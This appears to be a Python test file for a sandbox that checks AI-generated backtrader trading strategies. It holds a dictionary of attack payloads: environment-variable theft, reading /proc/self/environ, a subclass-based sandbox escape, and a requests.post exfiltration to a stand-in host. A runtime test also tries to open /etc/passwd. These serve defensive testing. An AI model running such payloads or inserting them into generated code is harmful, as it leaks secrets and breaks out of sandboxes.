"""
Tests for the generated-strategy sandbox.

Deliberately dependency-free: the sandbox uses only `ast` and `builtins`, so
these run without backtrader, AWS credentials, or a model call.

    cd agents/app/quant_agent && python test_strategy_sandbox.py
"""

import importlib.util
import pathlib
import sys
import types

# Load the sandbox module straight from its path. Importing `tools.strategy_sandbox`
# would execute tools/__init__.py, which pulls in backtrader — and the point of
# this suite is that it runs anywhere, with no dependencies and no credentials.
_MODULE_PATH = pathlib.Path(__file__).parent / "tools" / "strategy_sandbox.py"
_spec = importlib.util.spec_from_file_location("strategy_sandbox", _MODULE_PATH)
_sandbox = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_sandbox)

SandboxViolation = _sandbox.SandboxViolation
build_sandbox_globals = _sandbox.build_sandbox_globals
validate_strategy_code = _sandbox.validate_strategy_code

# The exact strategy the generator produced for TSLA 5/20 EMA — the sandbox is
# useless if it rejects real output.
REAL_STRATEGY = '''
import backtrader as bt
import backtrader.indicators as btind
import backtrader.analyzers as btanalyzers


class MyTradingStrategyStrategy(bt.Strategy):
    params = (
        ('stop_loss', 10.0),
        ('take_profit', 30.0),
        ('ema_fast_period', 5),
        ('ema_slow_period', 20),
    )

    def __init__(self):
        self.ema_fast = btind.EMA(self.data.close, period=self.params.ema_fast_period)
        self.ema_slow = btind.EMA(self.data.close, period=self.params.ema_slow_period)
        self.crossover = btind.CrossOver(self.ema_fast, self.ema_slow)
        self.buy_price = None

    def next(self):
        if not self.position:
            if self.crossover > 0:
                size = int(self.broker.getcash() * 0.95 / self.data.close[0])
                if size > 0:
                    self.buy(size=size)
                    self.buy_price = self.data.close[0]
        else:
            if self.buy_price:
                pct_change = (self.data.close[0] - self.buy_price) / self.buy_price * 100
                if pct_change <= -self.params.stop_loss:
                    self.sell(size=self.position.size)
                    self.buy_price = None
                    return
            if self.crossover < 0:
                self.sell(size=self.position.size)
                self.buy_price = None
'''

ATTACKS = {
    "direct os import": "import os\nprint(os.environ)",
    "from-import of os": "from os import environ\nprint(environ)",
    "dunder import call": "x = __import__('os').environ",
    "file read": "data = open('/proc/self/environ').read()",
    "eval": "x = eval('1+1')",
    "exec": "exec('import os')",
    "subclasses escape": "cls = ().__class__.__bases__[0].__subclasses__()",
    "globals introspection": "g = globals()",
    "getattr indirection": "f = getattr(__builtins__, 'open')",
    "func globals leak": "def f(): pass\nsecrets = f.__globals__",
    "global statement": "def f():\n    global x\n    x = 1",
    "socket import": "import socket\ns = socket.socket()",
    "requests exfil": "import requests\nrequests.post('http://evil.tld', json={'a': 1})",
}


def main() -> int:
    failures = []

    # 1. Real generated code must pass.
    try:
        cleaned = validate_strategy_code(REAL_STRATEGY)
        print(f"✅ real generated strategy ACCEPTED ({len(cleaned)} chars)")
    except SandboxViolation as e:
        failures.append(f"real strategy wrongly rejected: {e}")
        print(f"❌ real generated strategy REJECTED: {e}")

    # 2. Markdown-fenced code must still be accepted (defensive).
    try:
        validate_strategy_code("```python\n" + REAL_STRATEGY + "\n```")
        print("✅ markdown-fenced strategy accepted (fences stripped)")
    except SandboxViolation as e:
        failures.append(f"fenced strategy wrongly rejected: {e}")
        print(f"❌ fenced strategy REJECTED: {e}")

    # 3. Every attack must be rejected.
    print("\n--- attack payloads (all must be REJECTED) ---")
    for name, payload in ATTACKS.items():
        try:
            validate_strategy_code(payload)
            failures.append(f"attack NOT blocked: {name}")
            print(f"❌ {name:<24} ALLOWED THROUGH")
        except SandboxViolation:
            print(f"✅ {name:<24} blocked")

    # 4. The execution namespace must not expose dangerous builtins.
    print("\n--- execution namespace ---")
    fake_bt = types.ModuleType("backtrader")
    fake_bt.indicators = types.ModuleType("backtrader.indicators")
    fake_bt.analyzers = types.ModuleType("backtrader.analyzers")
    ns = build_sandbox_globals(fake_bt)
    exposed = ns["__builtins__"]

    for forbidden in ("open", "eval", "exec", "compile", "globals", "getattr"):
        if forbidden in exposed:
            failures.append(f"{forbidden!r} exposed in sandbox builtins")
            print(f"❌ {forbidden!r} is reachable")
        else:
            print(f"✅ {forbidden!r} absent from builtins")

    # `__import__` must be PRESENT but guarded. Removing it outright breaks the
    # `import backtrader as bt` line that every real strategy starts with —
    # that regression shipped once because this case was untested.
    guarded = exposed.get("__import__")
    if guarded is None:
        failures.append("__import__ missing — legitimate imports will fail")
        print("❌ '__import__' absent — real strategies cannot import backtrader")
    else:
        try:
            guarded("os")
            failures.append("guarded __import__ allowed 'os'")
            print("❌ guarded __import__ allowed 'os'")
        except ImportError:
            print("✅ guarded __import__ blocks 'os'")
        try:
            guarded("math")
            print("✅ guarded __import__ permits allowlisted 'math'")
        except ImportError:
            failures.append("guarded __import__ wrongly blocked 'math'")
            print("❌ guarded __import__ blocked allowlisted 'math'")

    # 5. Class definition must still work in the restricted namespace — this is
    #    what `__build_class__` is for; without it no strategy can be defined.
    try:
        exec("class Probe:\n    def __init__(self):\n        self.x = int(1)\n", ns)
        assert "Probe" in ns
        print("✅ class definition works under restricted builtins")
    except Exception as e:
        failures.append(f"class definition broken in sandbox: {e}")
        print(f"❌ class definition failed: {e}")

    # 6. Runtime defence: even if a payload reached exec, builtins are gone.
    try:
        exec("open('/etc/passwd')", build_sandbox_globals(fake_bt))
        failures.append("runtime: open() succeeded inside sandbox")
        print("❌ runtime: open() was callable")
    except NameError:
        print("✅ runtime: open() raises NameError inside sandbox")
    except Exception as e:
        print(f"✅ runtime: open() blocked ({type(e).__name__})")

    # 7. END TO END: actually execute the real strategy in the sandbox.
    #    Validating it and separately exec'ing a trivial class is NOT the same
    #    test — the gap between them is precisely where the `__import__`
    #    regression lived. backtrader is stubbed into sys.modules so the real
    #    `import backtrader as bt` line runs without the dependency installed.
    print("\n--- end-to-end execution of the real strategy ---")
    stub = types.ModuleType("backtrader")

    class _Strategy:  # stand-in base class
        pass

    stub.Strategy = _Strategy
    stub.indicators = types.ModuleType("backtrader.indicators")
    stub.analyzers = types.ModuleType("backtrader.analyzers")
    sys.modules["backtrader"] = stub
    sys.modules["backtrader.indicators"] = stub.indicators
    sys.modules["backtrader.analyzers"] = stub.analyzers

    try:
        code = validate_strategy_code(REAL_STRATEGY)
        e2e_ns = build_sandbox_globals(stub)
        exec(code, e2e_ns)
        found = [
            n for n, o in e2e_ns.items()
            if isinstance(o, type) and issubclass(o, _Strategy) and o is not _Strategy
        ]
        if found:
            print(f"✅ real strategy validated AND executed — class {found[0]!r} defined")
        else:
            failures.append("real strategy executed but defined no Strategy subclass")
            print("❌ no strategy class produced")
    except Exception as e:
        failures.append(f"real strategy failed end-to-end: {type(e).__name__}: {e}")
        print(f"❌ end-to-end execution failed: {type(e).__name__}: {e}")

    print("\n" + "=" * 56)
    if failures:
        print(f"FAILED — {len(failures)} problem(s):")
        for f in failures:
            print(f"  - {f}")
        return 1
    print("ALL SANDBOX TESTS PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
